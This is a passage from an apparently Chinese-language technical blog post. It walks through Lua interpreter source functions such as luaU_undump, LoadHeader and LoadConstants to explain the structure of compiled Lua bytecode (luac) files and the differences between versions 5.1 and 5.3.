&gt;= <span class="number">1</span>) &#123;  <span class="comment">/* does it have an upvalue? */</span></span><br><span class="line">      <span class="comment">/* get global table from registry */</span></span><br><span class="line">      Table *reg = hvalue(&amp;G(L)-&gt;l_registry);</span><br><span class="line">      <span class="type">const</span> TValue *gt = luaH_getint(reg, LUA_RIDX_GLOBALS);</span><br><span class="line">      <span class="comment">/* set global table as 1st upvalue of &#x27;f&#x27; (may be LUA_ENV) */</span></span><br><span class="line">      setobj(L, f-&gt;upvals[<span class="number">0</span>]-&gt;v, gt);</span><br><span class="line">      luaC_upvalbarrier(L, f-&gt;upvals[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_unlock(L);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接进入我们关注的部分<code>luaD_protectedparser</code></p><h3 id="luaD-protectedparser"><a href="#luaD-protectedparser" class="headerlink" title="luaD_protectedparser"></a>luaD_protectedparser</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">luaD_protectedparser</span> <span class="params">(lua_State *L, ZIO *z, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                                        <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">SParser</span> <span class="title">p</span>;</span></span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  L-&gt;nny++;  <span class="comment">/* cannot yield during parsing */</span></span><br><span class="line">  p.z = z; p.name = name; p.mode = mode;</span><br><span class="line">  p.dyd.actvar.arr = <span class="literal">NULL</span>; p.dyd.actvar.size = <span class="number">0</span>;</span><br><span class="line">  p.dyd.gt.arr = <span class="literal">NULL</span>; p.dyd.gt.size = <span class="number">0</span>;</span><br><span class="line">  p.dyd.label.arr = <span class="literal">NULL</span>; p.dyd.label.size = <span class="number">0</span>;</span><br><span class="line">  luaZ_initbuffer(L, &amp;p.buff);</span><br><span class="line">  status = luaD_pcall(L, f_parser, &amp;p, savestack(L, L-&gt;top), L-&gt;errfunc);</span><br><span class="line">  luaZ_freebuffer(L, &amp;p.buff);</span><br><span class="line">  luaM_freearray(L, p.dyd.actvar.arr, p.dyd.actvar.size);</span><br><span class="line">  luaM_freearray(L, p.dyd.gt.arr, p.dyd.gt.size);</span><br><span class="line">  luaM_freearray(L, p.dyd.label.arr, p.dyd.label.size);</span><br><span class="line">  L-&gt;nny--;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上两个函数其实都没有针对字节码文件的专门处理,无需过多关注</p><h3 id="f-parser"><a href="#f-parser" class="headerlink" title="f_parser"></a>f_parser</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">f_parser</span> <span class="params">(lua_State *L, <span class="type">void</span> *ud)</span> &#123;</span><br><span class="line">  LClosure *cl;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">SParser</span> *<span class="title">p</span> =</span> cast(<span class="keyword">struct</span> SParser *, ud);</span><br><span class="line">  <span class="type">int</span> c = zgetc(p-&gt;z);  <span class="comment">/* read first character */</span></span><br><span class="line">  <span class="keyword">if</span> (c == LUA_SIGNATURE[<span class="number">0</span>]) &#123;</span><br><span class="line">    checkmode(L, p-&gt;mode, <span class="string">&quot;binary&quot;</span>);</span><br><span class="line">    cl = luaU_undump(L, p-&gt;z, p-&gt;name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    checkmode(L, p-&gt;mode, <span class="string">&quot;text&quot;</span>);</span><br><span class="line">    cl = luaY_parser(L, p-&gt;z, &amp;p-&gt;buff, &amp;p-&gt;dyd, p-&gt;name, c);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_assert(cl-&gt;nupvalues == cl-&gt;p-&gt;sizeupvalues);</span><br><span class="line">  luaF_initupvals(L, cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次判断第一个字节是否为<code>1B</code>,是则处理函数设置为<code>luaU_undump</code></p><h3 id="luaU-undump"><a href="#luaU-undump" class="headerlink" title="luaU_undump"></a>luaU_undump</h3><p>终于正式开始加载字节码文件</p><p>在此之前5.1和5.3差异不大,不过在这个函数就开始出现较大差异了</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Proto* <span class="title function_">luaU_undump</span> <span class="params">(lua_State* L, ZIO* Z, Mbuffer* buff, <span class="type">const</span> <span class="type">char</span>* name)</span></span><br><span class="line">&#123;</span><br><span class="line"> LoadState S;</span><br><span class="line"> <span class="keyword">if</span> (*name==<span class="string">&#x27;@&#x27;</span> || *name==<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  S.name=name+<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (*name==LUA_SIGNATURE[<span class="number">0</span>])</span><br><span class="line">  S.name=<span class="string">&quot;binary string&quot;</span>;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">  S.name=name;</span><br><span class="line"> S.L=L;</span><br><span class="line"> S.Z=Z;</span><br><span class="line"> S.b=buff;</span><br><span class="line"> LoadHeader(&amp;S);</span><br><span class="line"> <span class="keyword">return</span> LoadFunction(&amp;S,luaS_newliteral(L,<span class="string">&quot;=?&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LoadHeader"><a href="#LoadHeader" class="headerlink" title="LoadHeader"></a>LoadHeader</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadHeader</span><span class="params">(LoadState* S)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> h[LUAC_HEADERSIZE];</span><br><span class="line"> <span class="type">char</span> s[LUAC_HEADERSIZE];</span><br><span class="line"> luaU_header(h);</span><br><span class="line"> LoadBlock(S,s,LUAC_HEADERSIZE);</span><br><span class="line"> IF (<span class="built_in">memcmp</span>(h,s,LUAC_HEADERSIZE)!=<span class="number">0</span>, <span class="string">&quot;bad header&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>luaU_header获取标准header</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaU_header</span> <span class="params">(<span class="type">char</span>* h)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> x=<span class="number">1</span>;</span><br><span class="line"> <span class="built_in">memcpy</span>(h,LUA_SIGNATURE,<span class="keyword">sizeof</span>(LUA_SIGNATURE)<span class="number">-1</span>);</span><br><span class="line"> h+=<span class="keyword">sizeof</span>(LUA_SIGNATURE)<span class="number">-1</span>;</span><br><span class="line"> *h++=(<span class="type">char</span>)LUAC_VERSION;</span><br><span class="line"> *h++=(<span class="type">char</span>)LUAC_FORMAT;</span><br><span class="line"> *h++=(<span class="type">char</span>)*(<span class="type">char</span>*)&amp;x;<span class="comment">/* endianness */</span></span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(<span class="type">size_t</span>);</span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(Instruction);</span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(lua_Number);</span><br><span class="line"> *h++=(<span class="type">char</span>)(((lua_Number)<span class="number">0.5</span>)==<span class="number">0</span>);<span class="comment">/* is lua_Number integral? */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LoadBlock则获取目标文件header</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadBlock</span><span class="params">(LoadState* S, <span class="type">void</span>* b, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">size_t</span> r=luaZ_read(S-&gt;Z,b,size);</span><br><span class="line"> IF (r!=<span class="number">0</span>, <span class="string">&quot;unexpected end&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里我们可以分析出字节码文件的header结构应该如下()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> signature[<span class="number">4</span>];   <span class="comment">// #define LUA_SIGNATURE   &quot;\033Lua&quot;</span></span><br><span class="line">    uchar version;</span><br><span class="line">    uchar format;</span><br><span class="line">    uchar endian;</span><br><span class="line">    uchar size_int;</span><br><span class="line">    uchar <span class="type">size_size_t</span>;</span><br><span class="line">    uchar size_Instruction;</span><br><span class="line">    uchar size_lua_Number;</span><br><span class="line">    uchar lua_num_valid;</span><br><span class="line">&#125; GlobalHeader;</span><br></pre></td></tr></table></figure><h5 id="LoadFunction"><a href="#LoadFunction" class="headerlink" title="LoadFunction"></a>LoadFunction</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> Proto* <span class="title function_">LoadFunction</span><span class="params">(LoadState* S, TString* p)</span></span><br><span class="line">&#123;</span><br><span class="line"> Proto* f;</span><br><span class="line"> <span class="keyword">if</span> (++S-&gt;L-&gt;nCcalls &gt; LUAI_MAXCCALLS) error(S,<span class="string">&quot;code too deep&quot;</span>);</span><br><span class="line"> f=luaF_newproto(S-&gt;L);</span><br><span class="line"> setptvalue2s(S-&gt;L,S-&gt;L-&gt;top,f); incr_top(S-&gt;L);</span><br><span class="line"> f-&gt;source=LoadString(S); </span><br><span class="line"> <span class="keyword">if</span> (f-&gt;source==<span class="literal">NULL</span>) f-&gt;source=p;</span><br><span class="line"> f-&gt;linedefined=LoadInt(S);</span><br><span class="line"> f-&gt;lastlinedefined=LoadInt(S);</span><br><span class="line"> f-&gt;nups=LoadByte(S);</span><br><span class="line"> f-&gt;numparams=LoadByte(S);</span><br><span class="line"> f-&gt;is_vararg=LoadByte(S);</span><br><span class="line"> f-&gt;maxstacksize=LoadByte(S);</span><br><span class="line"> LoadCode(S,f);</span><br><span class="line"> LoadConstants(S,f);</span><br><span class="line"> LoadDebug(S,f);</span><br><span class="line"> IF (!luaG_checkcode(f), <span class="string">&quot;bad code&quot;</span>);</span><br><span class="line"> S-&gt;L-&gt;top--;</span><br><span class="line"> S-&gt;L-&gt;nCcalls--;</span><br><span class="line"> <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个函数原型proto之后,加载proto的一些信息</p><ul><li><p><code>f-&gt;source</code>：尝试从字节码文件中加载函数的源代码位置信息，通常是文件名或函数名。</p></li><li><p><code>f-&gt;linedefined</code>：函数在源文件中定义的起始行号，通过 <code>LoadInt(S)</code> 读取。</p></li><li><p><code>f-&gt;lastlinedefined</code>：函数在源文件中的结束行号，表示函数的定义区间。</p></li><li><p><code>f-&gt;nups</code>：表示函数所需的 upvalues（闭包捕获的外部变量）的数量。</p></li><li><code>f-&gt;numparams</code>：表示函数的固定参数数量。</li><li><code>f-&gt;is_vararg</code>：表示函数是否是可变参数函数。该值是一个布尔标记，若为 1 则表示函数是可变参数的。</li><li><code>f-&gt;maxstacksize</code>：函数执行时需要的最大栈大小，表示该函数最多会占用多少 Lua 虚拟机的栈空间。</li></ul><h6 id="LoadCode"><a href="#LoadCode" class="headerlink" title="LoadCode"></a>LoadCode</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadCode</span><span class="params">(LoadState* S, Proto* f)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> n=LoadInt(S);</span><br><span class="line"> f-&gt;code=luaM_newvector(S-&gt;L,n,Instruction);</span><br><span class="line"> f-&gt;sizecode=n;</span><br><span class="line"> LoadVector(S,f-&gt;code,n,<span class="keyword">sizeof</span>(Instruction));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 <code>LoadCode(S, f)</code>从字节码文件中读取函数的实际指令(字节码)</p><p>使用 <code>f-&gt;code</code> 存储这些指令,<code>f-&gt;sizecode</code>存储指令数量</p><p>Lua一个指令占4个字节,下图是格式,但其实这个图理解起来可能会出现一些误解,因为通常人类认为的小端序,常常是默认左侧为低右侧为高(四个字节0123),但在字节内部确是左侧为高右侧为低(8bits—&gt;76543210)</p><p>虽然对于计算机来说不会出任何问题,但人在理解时有时就会出现差异,例如按照小端序取最低6位,本应该是0-5,但按照之前的理解实际上会取到2-7,并且高低位还会搞反,其实还是人自己理解的角度,写这么一大串就是因为我自己开始理解错了</p><p>但如果将Lua字节码字节串按字节反转,那么就刚好4字节32位完全按照从高到低排列,也就是下图</p><p>此外<code>mi_lua</code>在parse指令时就是先将其按字节反转,再套入顺序颠倒的Bitstruct,这样就得到了正确的操作码和操作数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/213123123.jpeg" alt=""></p><h6 id="LoadConstants"><a href="#LoadConstants" class="headerlink" title="LoadConstants"></a>LoadConstants</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadConstants</span><span class="params">(LoadState* S, Proto* f)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i,n;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;k=luaM_newvector(S-&gt;L,n,TValue);</span><br><span class="line"> f-&gt;sizek=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) setnilvalue(&amp;f-&gt;k[i]);</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line"> &#123;</span><br><span class="line">  TValue* o=&amp;f-&gt;k[i];</span><br><span class="line">  <span class="type">int</span> t=LoadChar(S);</span><br><span class="line">  <span class="keyword">switch</span> (t)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">case</span> LUA_TNIL:</span><br><span class="line">   setnilvalue(o);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> LUA_TBOOLEAN:</span><br><span class="line">   setbvalue(o,LoadChar(S)!=<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> LUA_TNUMBER:</span><br><span class="line">setnvalue(o,LoadNumber(S));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> LUA_TSTRING:</span><br><span class="line">setsvalue2n(S-&gt;L,o,LoadString(S));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">error(S,<span class="string">&quot;bad constant&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;p=luaM_newvector(S-&gt;L,n,Proto*);</span><br><span class="line"> f-&gt;sizep=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;p[i]=<span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;p[i]=LoadFunction(S,f-&gt;source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>f-&gt;k</code>存储常量</p><p><code>f-&gt;sizek</code>存储常量数量</p><ul><li><strong>LUA_TNIL</strong>： nil</li><li><strong>LUA_TBOOLEAN</strong>：布尔值</li><li><strong>LUA_TNUMBER</strong>：数字,使用浮点表示</li><li><strong>LUA_TSTRING</strong>：字符串。</li></ul><p>在处理完所有的常量之后,便开始了<strong>递归</strong>的处理该函数的所有子函数,并在<code>f-&gt;p</code>中存储子函数proto,<code>f-&gt;sizep</code>中存储子函数数量</p><p>到这里就可以分析知道luac文件除去header字段后,剩余部分就是<u>一个最大的proto嵌套更多小的proto,每个小的proto又继续往下嵌套</u></p><p>虽然只处理了四个常量,但实际上lua共有9个常量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** basic types</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNONE(-1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNIL0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TBOOLEAN1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TLIGHTUSERDATA2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNUMBER3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TSTRING4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTABLE5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TFUNCTION6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TUSERDATA7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTHREAD8</span></span><br></pre></td></tr></table></figure><h6 id="LoadDebug"><a href="#LoadDebug" class="headerlink" title="LoadDebug"></a>LoadDebug</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadDebug</span><span class="params">(LoadState* S, Proto* f)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i,n;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;lineinfo=luaM_newvector(S-&gt;L,n,<span class="type">int</span>);</span><br><span class="line"> f-&gt;sizelineinfo=n;</span><br><span class="line"> LoadVector(S,f-&gt;lineinfo,n,<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;locvars=luaM_newvector(S-&gt;L,n,LocVar);</span><br><span class="line"> f-&gt;sizelocvars=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;locvars[i].varname=<span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line"> &#123;</span><br><span class="line">  f-&gt;locvars[i].varname=LoadString(S);</span><br><span class="line">  f-&gt;locvars[i].startpc=LoadInt(S);</span><br><span class="line">  f-&gt;locvars[i].endpc=LoadInt(S);</span><br><span class="line"> &#125;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;upvalues=luaM_newvector(S-&gt;L,n,TString*);</span><br><span class="line"> f-&gt;sizeupvalues=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;upvalues[i]=<span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) f-&gt;upvalues[i]=LoadString(S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取行号信息，局部变量，和upvalue。</p><p>当函数A中包含子函数B，并且函数B访问了函数A的参数或局部变量时，就会产生upvalue</p><h4 id="5-3"><a href="#5-3" class="headerlink" title="5.3"></a>5.3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LClosure *<span class="title function_">luaU_undump</span><span class="params">(lua_State *L, ZIO *Z, <span class="type">const</span> <span class="type">char</span> *name)</span> &#123;</span><br><span class="line">  LoadState S;</span><br><span class="line">  LClosure *cl;</span><br><span class="line">  <span class="keyword">if</span> (*name == <span class="string">&#x27;@&#x27;</span> || *name == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    S.name = name + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*name == LUA_SIGNATURE[<span class="number">0</span>])</span><br><span class="line">    S.name = <span class="string">&quot;binary string&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    S.name = name;</span><br><span class="line">  S.L = L;</span><br><span class="line">  S.Z = Z;</span><br><span class="line">  checkHeader(&amp;S);</span><br><span class="line">  cl = luaF_newLclosure(L, LoadByte(&amp;S));</span><br><span class="line">  setclLvalue(L, L-&gt;top, cl);</span><br><span class="line">  luaD_inctop(L);</span><br><span class="line">  cl-&gt;p = luaF_newproto(L);</span><br><span class="line">  luaC_objbarrier(L, cl, cl-&gt;p);</span><br><span class="line">  LoadFunction(&amp;S, cl-&gt;p, <span class="literal">NULL</span>);</span><br><span class="line">  lua_assert(cl-&gt;nupvalues == cl-&gt;p-&gt;sizeupvalues);</span><br><span class="line">  luai_verifycode(L, buff, cl-&gt;p);</span><br><span class="line">  <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="checkHeader"><a href="#checkHeader" class="headerlink" title="checkHeader"></a>checkHeader</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">checkHeader</span> <span class="params">(LoadState *S)</span> &#123;</span><br><span class="line">  checkliteral(S, LUA_SIGNATURE + <span class="number">1</span>, <span class="string">&quot;not a&quot;</span>);  <span class="comment">/* 1st char already checked */</span></span><br><span class="line">  <span class="keyword">if</span> (LoadByte(S) != LUAC_VERSION)</span><br><span class="line">    error(S, <span class="string">&quot;version mismatch in&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (LoadByte(S) != LUAC_FORMAT)</span><br><span class="line">    error(S, <span class="string">&quot;format mismatch in&quot;</span>);</span><br><span class="line">  checkliteral(S, LUAC_DATA, <span class="string">&quot;corrupted&quot;</span>);</span><br><span class="line">  checksize(S, <span class="type">int</span>);</span><br><span class="line">  checksize(S, <span class="type">size_t</span>);</span><br><span class="line">  checksize(S, Instruction);</span><br><span class="line">  checksize(S, lua_Integer);</span><br><span class="line">  checksize(S, lua_Number);</span><br><span class="line">  <span class="keyword">if</span> (LoadInteger(S) != LUAC_INT)</span><br><span class="line">    error(S, <span class="string">&quot;endianness mismatch in&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (LoadNumber(S) != LUAC_NUM)</span><br><span class="line">    error(S, <span class="string">&quot;float format mismatch in&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.3中checkHeader取代了LoadHeader,并且Header格式也有一点变化</p><p>变成了如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> signature[<span class="number">4</span>];   <span class="comment">// #define LUA_SIGNATURE   &quot;\033Lua&quot;</span></span><br><span class="line">    uchar version;</span><br><span class="line">    uchar format;</span><br><span class="line">    <span class="type">char</span> luac_data[<span class="number">6</span>];  <span class="comment">//#define LUAC_DATA &quot;\x19\x93\r\n\x1a\n&quot;</span></span><br><span class="line">    uchar size_int;</span><br><span class="line">    uchar <span class="type">size_size_t</span>;</span><br><span class="line">    uchar size_Instruction;</span><br><span class="line">    uchar lua_Integer;</span><br><span class="line">    uchar size_lua_Number;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> endian;<span class="comment">//#define LUAC_INT 0x5678</span></span><br><span class="line">    <span class="type">double</span> lua_num_valid;<span class="comment">//#define LUAC_NUM cast_num(370.5)</span></span><br><span class="line">&#125; GlobalHeader;</span><br></pre></td></tr></table></figure><h5 id="LoadFunction-1"><a href="#LoadFunction-1" class="headerlink" title="LoadFunction"></a>LoadFunction</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 